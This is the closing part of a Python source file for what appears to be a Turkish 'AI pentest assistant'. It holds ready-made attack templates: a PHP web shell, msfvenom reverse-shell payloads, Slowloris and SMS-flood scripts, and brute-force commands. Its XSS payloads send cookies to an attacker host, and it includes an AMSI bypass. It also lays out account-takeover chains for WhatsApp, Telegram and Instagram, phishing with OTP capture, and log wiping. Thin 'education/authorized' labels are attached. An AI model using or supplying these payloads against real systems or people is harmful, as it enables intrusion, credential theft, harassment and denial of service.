    except Exception as e:
        print(f"[!] {p} -> {e}")''',

            "hashcat": r'''# Hashcat kullanimi (EGITIM / YETKILI TEST)
# Hash turunu belirle:
#   hashcat --example-hashes | grep -A2 MD5
# Kirma:
#   hashcat -m 0 hash.txt rockyou.txt            # MD5
#   hashcat -m 1000 ntlm.txt rockyou.txt -O      # NTLM (GPU)
#   hashcat -m 22000 cap.hc22000 rockyou.txt     # WPA2 handshake (cap2john ile donustur)
#   hashcat -m 13100 bcrypt.txt rockyou.txt      # bcrypt
# John alternatifi:
#   john --wordlist=rockyou.txt hash.txt
# Online servisler icin (rate-limit dikkat):
#   hydra -l admin -P pass.txt ssh://hedef.com''',

            "nmap": r'''# Nmap tarama rehberi (EGITIM / YETKILI HEDEF)
#   nmap -sV -sC -O hedef.com                      # servis + versiyon + OS
#   nmap -p- --min-rate 1000 hedef.com             # tum portlar
#   nmap -sU --top-ports 50 hedef.com              # UDP servisleri
#   nmap --script vuln hedef.com                   # zafiyet scriptleri
#   nmap -p 445 --script smb-enum-shares,smb-vuln-ms17-010 hedef.com
#   nmap -sV -oA tarama hedef.com                  # cikti kaydet''',

            "sms_bomber": r'''# SMS API rate-limit testi (EGITIM / KENDI SISTEMIN)
# NOT: Yalnizca kendi numaran veya onayli hedefle test et.
import requests, threading, time

TARGET_API = "https://hedef-api.com/send"   # kendi test endpoint'in
PHONE = "+905551234567"                      # KENDI numaran

def send_one():
    try:
        r = requests.post(TARGET_API, data={"phone": PHONE, "msg": "test"}, timeout=5)
        print(f"[{time.strftime('%H:%M:%S')}] HTTP {r.status_code}")
    except Exception as e:
        print("[!]", e)

print("[*] 10 paralel istek (rate-limit var mi?)")
threads = [threading.Thread(target=send_one) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
print("[+] Test bitti. Rate-limit yoksa API kotu yapilandirilmistir (raporla).")''',

            "hydra": r'''# Hydra - online brute force (EGITIM / YETKILI HEDEF)
#   hydra -l root -P pass.txt ssh://hedef.com
#   hydra -L users.txt -P pass.txt ssh://hedef.com -t 4
#   hydra -L users.txt -P pass.txt ftp://hedef.com
#   hydra -l admin -P pass.txt hedef.com http-post-form "/login:user=^USER^&pass=^PASS^:Hatali"
#   hydra -L users.txt -P pass.txt rdp://hedef.com
# Wordlist uret:
#   crunch 8 8 abc123! -o wl.txt''',

            "mitm": r'''# MITM (EGITIM / KENDI AGIN)
# 1) IP forwarding:
#   echo 1 > /proc/sys/net/ipv4/ip_forward
# 2) ARP spoof (arpspoof):
#   arpspoof -i eth0 -t HEDEF_IP GATEWAY_IP
# 3) Trafik izle:
#   tshark -i eth0 -Y "http.request" -T fields -e http.host -e http.request.uri
# bettercap ile:
#   bettercap -eval "set arp.spoof.targets HEDEF_IP; arp.spoof on; net.sniff on"
# mitmproxy (HTTPS dinleme - sertifika kurulumu gerekir):
#   mitmproxy --mode transparent''',

            "ddos": r'''# DoS/DDoS stres testi (EGITIM / KENDI TEST SUNUCUN)
# NOT: Ucuncu tarafa yonelik DDoS yasaktir.
#   hping3 -S --flood -p 80 127.0.0.1    # SYN flood
#   hping3 -2 --flood -p 53 127.0.0.1    # UDP flood

# Slowloris (Python) - baglantilari yarim tut:
import socket, time

TARGET = ("127.0.0.1", 80)   # KENDI sunucun
socks = []
for _ in range(200):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(TARGET)
        s.send(b"GET / HTTP/1.1\r\nHost: test\r\n")
        socks.append(s)
    except Exception:
        break
print(f"[*] {len(socks)} yarim baglanti tutuluyor")
time.sleep(5)
for s in socks:
    try: s.send(b"X-a: b\r\n")
    except Exception: pass
time.sleep(5)
for s in socks: s.close()
print("[+] Test bitti. Sunucu yanit veriyor mu kontrol et.")''',

            "web_shell": r'''<?php
// EGITIM / YETKILI TEST: Upload zafiyeti dogrulama kabugu
// Adi: shell.php -> upload testi yapilan sunucuya at
// Kullanim: http://hedef/uploads/shell.php?c=id
if (isset($_REQUEST['c'])) {
    echo "<pre>" . shell_exec($_REQUEST['c']) . "</pre>";
} else {
    echo "Upload test: OK. ?c=komut dene.";
}
?>''',

            "metasploit": r'''# Metasploit (EGITIM / YETKILI TEST)
# msfvenom payload uret:
#   msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf
#   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
# Dinleyici:
#   msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4444; run"
# Exploit arama:
#   msfconsole -> search <servis> -> use ... -> set RHOSTS -> run
# Post-exploitation:
#   sysinfo / getuid / shell / download / upload / getsystem (windows)''',

            "privesc": r'''# Yetki yukseltme (EGITIM / LAB ORTAMI)
# 1) linpeas:
#   curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# 2) sudo haklari:
#   sudo -l
#   -> GTFOBins: https://gtfobins.github.io (sudo vim, sudo python3 ...)
# 3) SUID dosyalar:
#   find / -perm -4000 -type f 2>/dev/null
# 4) Cron:
#   watch -n1 "ls -la /etc/cron* /var/spool/cron*"
# 5) Kernel surumu:
#   uname -a -> searchsploit <surum>''',

            "xss": r'''# XSS payload kutuphanesi (EGITIM / YETKILI TEST)
PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<script>fetch('http://SALDIRGAN/?c='+document.cookie)</script>",  # cookie exfil
    "<script src='http://SALDIRGAN:3000/hook.js'></script>",           # BeEF hook
    "<input onfocus=alert(1) autofocus>",
    "'-alert(1)-'",
]
for p in PAYLOADS:
    print(p)
# DalFox taramasi:
#   dalfox url http://hedef/?q=FUZZ''',

            "evasion": r'''# AMSI bypass + obfuscation (EGITIM / YETKILI TEST)
# 1) En basit AMSI patch (PowerShell):
# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# 2) Obfuscate:
#   $c = "calc"; & ([char](105)+[char](101)+[char](120)) $c
# 3) Base64:
#   $b = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("cmd /c whoami"))
#   powershell -enc $b
# 4) Invoke-Obfuscation (Kali):
#   git clone https://github.com/danielbohannon/Invoke-Obfuscation
# 5) Living off the land:
#   rundll32 javascript:"\..\mshtml,RunHTMLApplication";alert(1)''',
        }

    # ═══════════════════════════ ATAK ZİNCİRLERİ ═══════════════════════════
    def _build_chains(self):
        return {
            "whatsapp": {
                "title": "WhatsApp Güvenlik Testi",
                "phases": [
                    {"name": "Keşif", "steps": ["Numara doğrulama", "Profil fotoğrafı OSINT", "Durum bilgisi analizi"]},
                    {"name": "Sızma Vektörü Seçimi", "steps": ["QR Hijack", "Backup analizi", "OTP intercept"]},
                    {"name": "Uygulama", "steps": ["Vektörü çalıştır", "Session devralma", "Mesaj loglama"]},
                    {"name": "Raporlama", "steps": ["Bulguları dökümante et", "Risk skoru belirle", "Tavsiyeleri sun"]}
                ],
                "cleanup": "Oturumları kapat, test verilerini sil, raporu yetkili kişilere ilet."
            },
            "telegram": {
                "title": "Telegram Güvenlik Testi",
                "phases": [
                    {"name": "Keşif", "steps": ["Telegram API ID öğrenme", "Kullanıcı adı tespiti", "Grup üyelik analizi"]},
                    {"name": "Sızma", "steps": ["Session.dat çıkarma", "Cloud şifre brute-force testi", "2FA bypass dene"]},
                    {"name": "Post-Exploitation", "steps": ["Mesaj geçmişi analizi", "Bot/token keşfi", "Kontak senkronizasyonu"]},
                    {"name": "Raporlama", "steps": ["Zafiyetleri listele", "Çözüm önerileri sun"]}
                ],
                "cleanup": "Session dosyalarını sil, API token'ları iptal et."
            },
            "instagram": {
                "title": "Instagram Güvenlik Testi",
                "phases": [
                    {"name": "OSINT", "steps": ["Sherlock ile kullanıcı adı tarama", "E-posta/telefon bağlantısı (holehe)", "Sızıntı veritabanı kontrolü"]},
                    {"name": "Kimlik Bilgisi Saldırısı", "steps": ["Şifre sıfırlama akışı testi", "Phishing kampanyası (yetkili)", "Session cookie çalma testi"]},
                    {"name": "Hesap Ele Geçirme", "steps": ["OTP bypass dene", "Bağlı hesaplara pivot", "İçerik/veri çıkarma"]},
                    {"name": "Raporlama", "steps": ["2FA zafiyet analizi", "Oturum yönetimi önerileri"]}
                ],
                "cleanup": "Test hesaplarını eski haline getir, logları temizle."
            },
            "phishing": {
                "title": "Phishing Kampanyası",
                "phases": [
                    {"name": "Hazırlık", "steps": ["Hedef platform seç", "Login sayfasını klonla (kod üret phishing)", "VPS/ngrok ile yayınla", "HTTPS sertifikası kur"]},
                    {"name": "Dağıtım", "steps": ["E-posta/SMS/DM ile kampanya", "Typosquatting alan adı kullan", "Güvenilir gönderici adı taklit et"]},
                    {"name": "Toplama", "steps": ["Credential loglarını topla", "2FA varsa evilginx2 ile OTP yakala", "IP + User-Agent kaydet"]},
                    {"name": "Raporlama", "steps": ["Tıklama/girme oranlarını raporla", "Çalışan eğitimi öner", "Sayfayı kapat, logları temizle"]}
                ],
                "cleanup": "Sunucuyu kapat, logları sil, kurbanları bilgilendir (yetkili testte)."
            },
            "wifi": {
                "title": "WiFi Pentest Akışı",
                "phases": [
                    {"name": "Keşif", "steps": ["Ağ kartını monitor mode'a al", "airodump ile çevre ağlarını listele", "Hedef BSSID/kanal/şifreleme tespiti"]},
                    {"name": "Yakalama", "steps": ["Handshake yakala (passive)", "Gerekirse deauth ile zorla", "PMKID topla (hashcat)"]},
                    {"name": "Kırma", "steps": ["aircrack-ng ile offline kır", "hashcat -m 22000 ile GPU kır", "WPS PIN brute (reaver)"]},
                    {"name": "Ağ İçi", "steps": ["Ağa bağlan", "İç ağ keşfi (nmap)", "MITM testi (ettercap)"]},
                    {"name": "Raporlama", "steps": ["Zafiyet + güçlü şifre önerisi", "WPA3/802.1X tavsiyesi"]}
                ],
                "cleanup": "Monitor mode'u kapat (airmon-ng stop), capture dosyalarını sil."
            },
            "generic": {
                "title": "Genel Pentest Akışı",
                "phases": [
                    {"name": "Reconnaissance", "steps": ["Hedef belirleme", "IP/domain tespiti", "OSINT ve footprinting"]},
                    {"name": "Scanning", "steps": ["Port tarama (nmap)", "Servis versiyon tespiti", "Zafiyet taraması"]},
                    {"name": "Gaining Access", "steps": ["Exploit dene (yetkili)", "Sosyal mühendislik testi", "Kimlik bilgisi saldırısı"]},
                    {"name": "Maintaining Access", "steps": ["Session stabilizasyonu", "Kalıcılık mekanizmaları testi"]},
                    {"name": "Covering Tracks", "steps": ["Log temizliği", "Timeline analizi", "Raporlama"]}
                ],
                "cleanup": "Tüm test artefaktlarını kaldır, sistemleri orijinal durumuna döndür."
            }
        }


# ═══════════════════════════ BAŞLANGIÇ ═══════════════════════════
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MarkOsAi_5.0 — AI Pentest Asistanı")
    parser.add_argument("--web", action="store_true",
                        help="Web modu: ağdaki herkes tarayıcıdan kullanır (kayıt/şifre yok)")
    parser.add_argument("--port", type=int, default=8080, help="Web portu (varsayılan: 8080)")
    args = parser.parse_args()

    clear()
    ai = MarkOsAI()
    if args.web:
        ai.run_web(port=args.port)
    else:
        ai.interactive_chat()
